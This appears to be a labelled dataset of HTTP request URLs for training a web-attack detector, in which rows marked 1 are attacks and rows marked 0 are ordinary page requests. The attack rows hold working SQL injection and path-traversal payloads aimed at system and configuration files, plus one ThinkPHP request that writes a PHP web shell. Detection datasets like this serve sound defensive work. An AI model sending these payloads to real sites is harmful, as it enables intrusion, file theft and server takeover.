request_url,status
loginname=admin'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd,1
itemtype=6&depNO=1122'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122&approveName=&nowPage=3,1
depNO=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
FileUrl=c:%5Cwindows%5Cwin.ini,1
FileFullPath=%5Cetc%5Cpasswd&FileName=passwd,1
item_ID=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
"keywords=1122'/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,0x6366726565723A693A6A78,0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/and/**/'1'='1",1
"DataId=1&Code=2%27and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,0x6366726565723A693A6A78,0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23",1
searchContext=-1%25%27%20UNION%20%20ALL%20SELECT%20%20NULL%2CNULL%2CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%2898%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2897%29%7C%7CCHR%28110%29%7C%7CCHR%2858%29%7C%7CCHR%28105%29%7C%7CCHR%2858%29%7C%7CCHR%28102%29%7C%7CCHR%28105%29%7C%7CCHR%28110%29%7C%7CCHR%28100%29%2CNULL%20FROM%20DUAL%20--,1
FileFullPath=c:%5Cwindows%5Cwin.ini&FileName=win.ini,1
loginname=admin'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd,1
depNO=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
itemtype=12%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)&depNO=jx&approveName=&nowPage=3,1
status=showpage&LanguageType=1%27%20UNION%20ALL%20SELECT%20NULL%2Cchar%28119%29%2bchar%28101%29%2bchar%2898%29%2bchar%28115%29%2bchar%2899%29%2bchar%2897%29%2bchar%28110%29%2bchar%2858%29%2bchar%28105%29%2bchar%2859%29%2bchar%28102%29%2bchar%28105%29%2bchar%28110%29%2bchar%28100%29%2CNULL%2CNULL--%20,1
more=1&columnNameValue=2%27%20UNION%20ALL%20SELECT%20chr%28119%29%7C%7Cchr%28101%29%7C%7Cchr%2898%29%7C%7Cchr%28115%29%7C%7Cchr%2899%29%7C%7Cchr%2897%29%7C%7Cchr%28110%29%7C%7Cchr%2858%29%7C%7Cchr%28105%29%7C%7Cchr%2858%29%7C%7Cchr%28102%29%7C%7Cchr%28105%29%7C%7Cchr%28110%29%7C%7Cchr%28100%29%2CNULL%2CNULL%20FROM%20DUAL--&moreZongQi=021,1
FileUrl=%5Cetc%5Cpasswd,1
username=123%27%2f%2a%2a%2fand%2f%2a%2a%2f%28seleselectct%2f%2a%2a%2f1%2f%2a%2a%2ffrom%2f%2a%2a%2f%28selselectect%2f%2a%2a%2fcount%28%2a%29%2Cconcat%280x7c%2C0x7765627363616E3A693A66696E64%2C0x7c%2Cfloor%28rand%280%29%2a2%29%29x%2f%2a%2a%2ffrom%2f%2a%2a%2finformation_schema.tables%2f%2a%2a%2fgroup%2f%2a%2a%2fby%2f%2a%2a%2fx%29a%29%23,1
"flag=flag&NewsId=-12'%20union%20all%20select%20CHAR%2884%29%2bCHAR%2897%29%2bCHAR%28105%29%2bCHAR%2887%29%2bCHAR%2897%29%2bCHAR%28110%29%2bCHAR%2858%29%2bCHAR%28103%29%2bCHAR%28111%29%2bCHAR%2858%29%2bCHAR%28104%29%2bCHAR%28111%29%2bCHAR%28109%29%2bCHAR%28101%29,12,12,12,12,12,12,12,12--",1
more=1&columnNameValue=2%27%20UNION%20ALL%20SELECT%20chr%28119%29%7C%7Cchr%28101%29%7C%7Cchr%2898%29%7C%7Cchr%28115%29%7C%7Cchr%2899%29%7C%7Cchr%2897%29%7C%7Cchr%28110%29%7C%7Cchr%2858%29%7C%7Cchr%28105%29%7C%7Cchr%2858%29%7C%7Cchr%28102%29%7C%7Cchr%28105%29%7C%7Cchr%28110%29%7C%7Cchr%28100%29%2CNULL%2CNULL%20FROM%20DUAL--&moreZongQi=021,1
searchContext=-1%25%27%20UNION%20%20ALL%20SELECT%20%20NULL%2CNULL%2CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%2898%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2897%29%7C%7CCHR%28110%29%7C%7CCHR%2858%29%7C%7CCHR%28105%29%7C%7CCHR%2858%29%7C%7CCHR%28102%29%7C%7CCHR%28105%29%7C%7CCHR%28110%29%7C%7CCHR%28100%29%2CNULL%20FROM%20DUAL%20--,1
infotype=-1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20and%20'at'='at,1
ColumnCode=-12'%20union%20all%20select%20CHR(119)%7C%7CCHR(101)%7C%7CCHR(98)%7C%7CCHR(115)%7C%7CCHR(99)%7C%7CCHR(97)%7C%7CCHR(110)%7C%7CCHR(58)%7C%7CCHR(105)%7C%7CCHR(58)%7C%7CCHR(102)%7C%7CCHR(105)%7C%7CCHR(110)%7C%7CCHR(100)%20from%20DUAL%20--,1
RecordID=-2074%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28SELECT%20CONCAT%280x717765727479%2C0x3A746573743A%2C0x7168726371%29%20FROM%20ezoffice.org_employee%20LIMIT%2021%2C1%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&Template=0&FileType=.doc&EditType=1&UserName=1&moduleType=1&saveHtmlImage=1&saveDocFile=1,1
objfile=/etc/passwd,1
inputFile=/etc/passwd,1
errorName=/../../../../was/webroot/WEB-INF/web.xml,1
xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xml,1
locale=../../../../custommenu.xml%00en,1
spell=1%25%27%20UNION%20SELECT%20CHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%2858%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%2Cnull%20FROM%20DUAL%20--,1
picFile=../../../../../../../../conf/resin.conf,1
user_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
pk_infotype=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(109)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(97)%7C%7CCHR(97)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'ohehe'='ohehe,1
method=txtDownload&destFile=/../../../../was/webroot/WEB-INF/web.xml,1
user&q=action/check_email&email=%27%20and%20%28select%201%20from%20%28select%20count%28%2a%29%2Cconcat%28md5%280x7765627363616e%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23,1
userid=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd&pwd=1,1
xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xml,1
"LeadId=-1%20UNION%20ALL%20SELECT%20NULL,CHR(58)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(58)%7C%7CCHR(89)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(58),NULL,NULL,NULL,NULL%20FROM%20DUAL--%20&department_id=null&department_name=&department_no=1",1
m=Goods&a=showByUname&uname=%2527AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x7765627363616e%29%2CFLOOR%28RAND%280%29%2a2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%23,1
pk_message=-1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(117)%7C%7CCHR(117)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(98)%7C%7CCHR(98)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'ohe'='ohe,1
"type=info&type_id=3&id=-120'%20OR%20(SELECT%204774%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1122),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'BLkR'='BLkR&type_id=3&re=0",1
locale=../../../../custommenu.xml%00en,1
userid=1/**/AND/**/1122=(SELECT/**/UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT/**/(CASE/**/WHEN/**/(1122=1122)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))/**/FROM/**/DUAL)%20--,1
filename=..%5CWEB-INF%5Cweb.xml,1
"DataId=1&Code=1%27and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,md5(0x234445),0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23",1
fax_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
pkcorp=1'%20AND%204310=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(106)%7C%7CCHR(107)%7C%7CCHR(106)%7C%7CCHR(109)%7C%7C(SELECT%20(CASE%20WHEN%20(4310=4310)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(113)%7C%7CCHR(111)%7C%7CCHR(58)%7C%7CCHR(109)%7C%7CCHR(113)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'HdRC'='HdRC,1
path=c:/windows/win.ini,1
user_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20MlzN,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20TAHV,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
"/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23",1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20QLIs,1
/user.php?act=login,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=WEB-INF%2Fweb.xml%3F,1
/136.news.detail.phtml?news_id=file%3A%2F%2F%2Fetc%2Fpasswd,1
/common.login.login.dhtml?username=&loginsave=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&password=,1
/common.login.login.dhtml?username=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&loginsave=&password=,1
/187.news.list.phtml?page=WEB-INF%5Cweb.xml,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=WEB-INF%2Fweb.xml,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini&mem_mphone=,1
/common.login.doregister.dhtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=file%3A%2F%2F%2Fetc%2Fpasswd,1
/194.news.commentlist.phtml?news_id=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd,1
/187.news.list.phtml?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,1
"/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E",1
/eap/41.news.list?newstimeend=&newstitle=&page=&newstimestart=%29%20AND%201611%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281611%3D1611%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%285523%3D5523,1
/eap/41.news.list?newstimeend=&newstitle=%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29aONY%29&page=&newstimestart=,1
/hy_Picture_cause.asp?classid=27,0
/news_picture.asp?id=223,0
/news_picture.asp?id=231,0
/donate_show.asp?id=140,0
/rescue_show.asp?id=174,0
/donate_show.asp?id=98,0
/about_show.asp?id=114,0
/donate_show.asp?id=126,0
/news_show.asp?id=11,0
/news_show.asp?id=267,0
/news_show.asp?id=69,0
/news_show.asp?id=170,0
/hy_picture.asp?classid=11&page=4,0
/news_picture.asp?id=427,0
/volunteer_show.asp?id=178,0
/hy_picture.asp?classid=11&page=2,0
/upload/201201/20120130085244596.jpg,0
/robots.txt,0
/donate_show.asp?id=141,0
/hycause.asp?classid=23,0
/about_show.asp?id=104,0
/donate_show.asp?id=533,0
/news_show.asp?id=277,0
/hycause.asp?classid=19&page=1,0
/donate_show.asp?id=534,0
/hy_picture.asp?classid=11&page=7,0
/news_show.asp?id=205,0
/donate_show.asp?id=536,0
/hynews.asp?classid=1&page=3,0
/donate_show.asp?id=532,0
/hy_picture.asp?classid=11&page=8,0
/donate_show.asp?id=96,0
/news_show.asp?id=280,0
/hydonate.asp?classid=10&page=4,0
/news_show.asp?id=209,0
/download.asp,0
/news_show.asp?id=468,0
/news_show.asp?id=533,0
/hynews.asp?classid=1&page=8,0
/search.asp?classid=0&page=7&search,0
/search.asp?classid=0&page=6&search,0
/news_show.asp?id=535,0
/hynews.asp?classid=1&page=4,0
/search_xs.asp?id=242,0
/search_xs.asp?id=181,0
/news_show.asp?id=536,0
/hydonate.asp?classid=10,0
/news_show.asp?id=63,0
/search.asp?classid=0&page=18&search,0
/search.asp?classid=0&page=27&search,0
/search_xs.asp?id=439,0
/search.asp?classid=0&page=26&search,0
/search.asp?classid=0&page=9&search,0
/search_xs.asp?id=401,0
/volunteer_show.asp?id=62,0
/search_xs.asp?id=309,0
/search_xs.asp?id=390,0
/search_xs.asp?id=485,0
/hy_picture.asp?classid=11&page=8,0
/volunteer_show.asp?id=179,0
/about_show.asp?id=59,0
/hynews.asp?classid=10&page=3,0
/hyabout.asp?classid=34,0
/hy_picture.asp?classid=11,0
/hy_picture.asp?classid=11&page=7,0
/hyabout.asp?classid=48,0
/hyabout.asp?classid=31,0
/donate_show.asp?id=139,0
/hynews.asp?classid=1&page=2,0
/search.asp?classid=0&page=10&search,0
/search.asp?classid=0&page=1&search,0
/news_show.asp?id=319,0
/search.asp?classid=0&page=13&search,0
/search.asp?classid=0&page=21&search,0
/index.asp,0
/hynews.asp?classid=10&page=6,0
/search_xs.asp?id=159,0
/search_xs.asp?id=242,0
/hy_picture.asp?classid=11&page=4,0
/search.asp?classid=0&page=5&search,0
/hycause.asp?classid=26,0
/search.asp?classid=0&page=12&search,0
/search_xs.asp?id=104,0
/search_xs.asp?id=177,0
/search_xs.asp?id=78,0
/search.asp?classid=0&page=4,0
/search_xs.asp?id=380,0
/search_xs.asp?id=176,0
/search_xs.asp?id=155,0
/search_xs.asp?id=330,0
/wp-login.php,0
/cause_show.asp?id=122,0
/news_picture.asp?id=242,0
/robots.txt,0
/about_show.asp?id=125,0
/about_show.asp?id=459,0
/about_show.asp?id=477,0
/about_show.asp?id=478,0
/about_show.asp?id=479,0
/about_show.asp?id=529,0
/cause_show.asp?id=100,0
/cause_show.asp?id=101,0
/cause_show.asp?id=108,0
/cause_show.asp?id=110,0
/cause_show.asp?id=111,0
/cause_show.asp?id=112,0
/cause_show.asp?id=115,0
/cause_show.asp?id=116,0
/cause_show.asp?id=117,0
/cause_show.asp?id=118,0
/cause_show.asp?id=122,0
/cause_show.asp?id=86,0
/cause_show.asp?id=87,0
/cause_show.asp?id=95,0
/cause_show.asp?id=97,0
/donate_show.asp?id=141,0
/donate_show.asp?id=173,0
/donate_show.asp?id=182,0
/donate_show.asp?id=183,0
/donate_show.asp?id=184,0
/donate_show.asp?id=185,0
/donate_show.asp?id=186,0
/donate_show.asp?id=188,0
/donate_show.asp?id=303,0
/download.asp,0
/news_picture.asp?id=66,0
/news_picture.asp?id=66&WebShieldDRSessionVerify=dlbyiuWGRJkpPAoubelA,0
/news_show.asp?id=66,0
/robots.txt,0
/news_picture.asp?id=66,0
/news_show.asp?id=66,0
/about_show.asp?id=60,0
/style/jquery.lightbox.css,0
/js/jquery.js,0
/script/MSClass.js,0
/js/jquery.lightbox.js,0
/robots.txt,0
/js/jquery.min.js,0
/js/lrtk.js,0
/kxfzg2.htm,0
/hyabout.asp?classid=31&page=3,0
/robots.txt,0
/donate_show.asp?id=96,0
/donate_show.asp?id=96,0
/donate_show.asp?id=184,0
/online.asp,0
/news_show.asp?id=64,0
/robots.txt,0
/index.asp,0
/hyabout.asp,0
/hypolicy.asp,0
/hycause.asp,0
/hyvolunteer.asp,0
/hyrescue.asp,0
/hydonate.asp,0
/download.asp,0
/online.asp,0
/lxwm.asp,0
/hynews.asp?classid=1,0
/news_show.asp?id=540,0
/news_show.asp?id=539,0
/news_show.asp?id=538,0
/news_show.asp?id=537,0
/news_show.asp?id=536,0
/news_show.asp?id=535,0
/news_show.asp?id=534,0
/hy_Picture_cause.asp?classid=36,0
/hydonate.asp?classid=4,0
/donate_show.asp?id=303,0
/donate_show.asp?id=190,0
/donate_show.asp?id=189,0
/donate_show.asp?id=188,0
/donate_show.asp?id=187,0
/donate_show.asp?id=186,0
/donate_show.asp?id=185,0
/donate_show.asp?id=184,0
/donate_show.asp?id=183,0
/donate_show.asp?id=182,0
/donate_show.asp?id=173,0
/donate_show.asp?id=141,0
/hycause.asp?classid=19,0
/hypolicy.asp?classid=5,0
/policy_show.asp?id=153,0
/policy_show.asp?id=152,0
/policy_show.asp?id=151,0
/policy_show.asp?id=150,0
/policy_show.asp?id=149,0
/policy_show.asp?id=148,0
/policy_show.asp?id=147,0
/policy_show.asp?id=146,0
/policy_show.asp?id=145,0
/policy_show.asp?id=144,0
/hy_picture.asp?classid=11,0
/news_picture.asp?id=523,0
/news_picture.asp?id=522,0
/news_picture.asp?id=521,0
/news_picture.asp?id=520,0
/news_picture.asp?id=519,0
/news_picture.asp?id=518,0
/news_picture.asp?id=517,0
/news_picture.asp?id=516,0
/news_picture.asp?id=515,0
/hycause.asp?classid=6,0
/cause_show.asp?id=526,0
/cause_show.asp?id=525,0
/cause_show.asp?id=467,0
/cause_show.asp?id=455,0
/cause_show.asp?id=454,0
/cause_show.asp?id=453,0
/cause_show.asp?id=452,0
/cause_show.asp?id=451,0
/cause_show.asp?id=450,0
/cause_show.asp?id=449,0
/hyabout.asp?classid=35,0
/about_show.asp?id=158,0
/about_show.asp?id=157,0
/about_show.asp?id=156,0
/about_show.asp?id=155,0
/about_show.asp?id=154,0
/about_show.asp?id=60,0
/hyabout.asp?classid=31,0
/hyabout_txt.asp?classid=32,0
/hyabout_txt.asp?classid=33,0
/hyabout.asp?classid=34,0
/hyabout.asp?classid=48,0
/about_show.asp?id=529,0
/about_show.asp?id=477,0
/about_show.asp?id=459,0
/about_show.asp?id=388,0
/about_show.asp?id=387,0
/about_show.asp?id=125,0
/about_show.asp?id=124,0
/about_show.asp?id=121,0
/about_show.asp?id=120,0
/about_show.asp?id=119,0
/hyabout.asp?classid=31&page=2,0
/hyabout.asp?classid=31&page=3,0
/hypolicy.asp?classid=28,0
/hypolicy.asp?classid=29,0
/hypolicy.asp?classid=30,0
/hypolicy.asp?classid=5&page=2,0
/hycause.asp?classid=21,0
/hycause.asp?classid=22,0
/hycause.asp?classid=23,0
/hycause.asp?classid=24,0
/hycause.asp?classid=25,0
/hycause.asp?classid=26,0
/hycause.asp?classid=27,0
/cause_show.asp?id=122,0
/cause_show.asp?id=118,0
/cause_show.asp?id=117,0
/cause_show.asp?id=116,0
/cause_show.asp?id=115,0
/cause_show.asp?id=112,0
/cause_show.asp?id=111,0
/cause_show.asp?id=110,0
/cause_show.asp?id=108,0
/cause_show.asp?id=101,0
/cause_show.asp?id=100,0
/cause_show.asp?id=97,0
/cause_show.asp?id=95,0
/cause_show.asp?id=87,0
/cause_show.asp?id=86,0
/hycause.asp?classid=19&page=2,0
/hyvolunteer.asp?classid=42,0
/hyvolunteer.asp?classid=43,0
/hyvolunteer.asp?classid=44,0
